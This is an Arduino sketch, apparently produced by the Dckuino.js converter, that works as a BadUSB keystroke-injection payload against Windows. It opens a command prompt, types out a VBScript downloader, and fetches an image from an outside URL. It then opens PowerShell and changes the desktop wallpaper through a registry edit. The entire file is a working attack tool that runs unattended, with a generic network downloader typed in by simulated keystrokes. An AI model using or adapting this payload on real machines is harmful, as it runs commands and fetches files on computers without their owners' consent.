/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void esp_print(String text){
  for (int i = 0; i<=text.length(); i++)
  {
      char val = text[i];
      if (val == ':'){
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.print(".");
        Keyboard.releaseAll();
      }
      else if (val == '/'){
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.print("7");
        Keyboard.releaseAll();
      }
      else if (val == '('){
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.print("8");
          Keyboard.releaseAll();
      }
      else if (val == ')'){
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.print("9");
          Keyboard.releaseAll();
      }
      else if (val == '='){
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.print("0");
          Keyboard.releaseAll();
      }
      else if (val == ';'){
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.print(",");
          Keyboard.releaseAll();
      }
      else if (val == '"'){
          Keyboard.press(KEY_LEFT_SHIFT);       
          Keyboard.print("2");
          Keyboard.releaseAll();
      }
      else if (val == '-'){
          Keyboard.print("/");
      }
      else if (val == '\\'){
          Keyboard.press(KEY_RIGHT_ALT);       
          Keyboard.print("`");
          Keyboard.releaseAll();      
      }
      else{
        Keyboard.print(val);
      }
  }
}
  
void opencmd(){
  typeKey(KEY_ESC);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(400);
  Keyboard.print("cmd");
  delay(400);
  typeKey(KEY_RETURN);
}

void changedir(String letter, String directory){
  Keyboard.print(letter);
  typeKey(KEY_RETURN);
  Keyboard.print("cd ..");
  typeKey(KEY_RETURN);
  Keyboard.print("cd ..");
  typeKey(KEY_RETURN);
  Keyboard.print("cd ..");
  typeKey(KEY_RETURN);
  Keyboard.print("cd ..");
  typeKey(KEY_RETURN);
  Keyboard.print("cd ..");
  typeKey(KEY_RETURN);
  Keyboard.print("cd ..");
  typeKey(KEY_RETURN);
  Keyboard.print("cd ..");
  typeKey(KEY_RETURN);
  esp_print("cd "+directory);
  typeKey(KEY_RETURN); 
}

void createdownlscript(){
  Keyboard.print("copy con download.vbs");
  typeKey(KEY_RETURN);
  esp_print("Set args = WScript.Arguments:a = split(args(0), \"/\")(UBound(split(args(0),\"/\")))");
  typeKey(KEY_RETURN);
  esp_print("Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\"):objXMLHTTP.open \"GET\", args(0), false:objXMLHTTP.send()");
  typeKey(KEY_RETURN);
  esp_print("If objXMLHTTP.Status = 200 Then");
  typeKey(KEY_RETURN);
  esp_print("Set objADOStream = CreateObject(\"ADODB.Stream\"):objADOStream.Open");
  typeKey(KEY_RETURN);
  esp_print("objADOStream.Type = 1:objADOStream.Write objXMLHTTP.ResponseBody:objADOStream.Position = 0");
  typeKey(KEY_RETURN);
  esp_print("Set objFSO = Createobject(\"Scripting.FileSystemObject\"):If objFSO.Fileexists(a) Then objFSO.DeleteFile a");
  typeKey(KEY_RETURN);
  esp_print("objADOStream.SaveToFile a:objADOStream.Close:Set objADOStream = Nothing");
  typeKey(KEY_RETURN);
  esp_print("End if:Set objXMLHTTP = Nothing:Set objFSO = Nothing");
  typeKey(KEY_RETURN);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  Keyboard.releaseAll();
  typeKey(KEY_RETURN);
}

void deletedownlscript(){
  Keyboard.print("del download.vbs");
  typeKey(KEY_RETURN);
}

void openpowershell(){
  typeKey(KEY_ESC);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("powershell");
  delay(100);
  typeKey(KEY_RETURN);
}

void changewallpaper(String letter, String directory, String imagename){
  esp_print("Set-ItemProperty -path \"HKCU:\\Control Panel\\Desktop\\\" -name wallpaper -value \""+letter+"\\"+directory+"\\"+imagename+"\" ");
  typeKey(KEY_RETURN);
  delay(1000);
  esp_print("rundll32.exe user32.dll, UpdatePerUserSystemParameters 1, True");
  typeKey(KEY_RETURN);
  delay(500);
}

void downloadimage(String letter, String directory, String imagename, String url){
  opencmd();
  delay(100);
  changedir(letter, directory);
  deletedownlscript();
  createdownlscript();
  Keyboard.print("del "+imagename);
  typeKey(KEY_RETURN);
  esp_print("cscript download.vbs "+url);
  typeKey(KEY_RETURN);
  deletedownlscript();
  Keyboard.print("exit");
  typeKey(KEY_RETURN);
  delay(1000);
}

void updatewallpaper(String letter, String directory, String imagename){
  openpowershell();
  delay(3000);
  for (int i = 0; i<=5; i++)
  {
    changewallpaper(letter, directory, imagename);
  }
  Keyboard.print("exit");
  typeKey(KEY_RETURN);
  delay(100);
}

void clean(String letter, String directory, String imagename){
  opencmd();
  delay(100);
  changedir(letter, directory);
  delay(100);
  Keyboard.print("del "+imagename);
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print("exit");
  typeKey(KEY_RETURN);
}

void setup()
{ 
  // Begining the Keyboard stream
  Keyboard.begin();
  delay(500);
  String letter = "C:";
  String directory = "Users\\Public";
  String imagename = "34gvq4g.jpg";
  String url = "http://oi67.tinypic.com/34gvq4g.jpg";
  downloadimage(letter, directory, imagename, url);
  updatewallpaper(letter, directory, imagename); 
  //clean(letter, directory, imagename);  
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
